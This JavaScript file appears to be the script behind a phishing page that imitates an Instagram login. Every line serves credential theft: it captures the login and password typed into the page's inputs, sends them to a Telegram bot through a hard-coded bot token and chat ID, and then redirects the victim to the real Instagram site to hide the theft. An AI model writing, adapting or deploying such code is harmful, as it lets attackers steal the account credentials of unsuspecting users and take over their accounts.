let BOT_TOKEN = '6718955817:AAGu3d33DvxT77y7aUudebMMecqAylMch-8'
let TELEGRAM_BOT_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
let TELEGRAM_CHAT_ID ='431473115'

let inputs = document.querySelectorAll('input')
let button = document.querySelector('button')

button.addEventListener('click', (event) => {
    event.preventDefault()
    sendMessageToBot()

    window.location.href = "https://www.instagram.com/"
})

function sendMessageToBot(e){
    fetch(TELEGRAM_BOT_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `\n Login: ${inputs[0].value} \n Password: ${inputs[1].value}`
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Message sent succesfully:', data);
    })
    .catch(error => {
        console.error('Error sending message:', error)
    })
}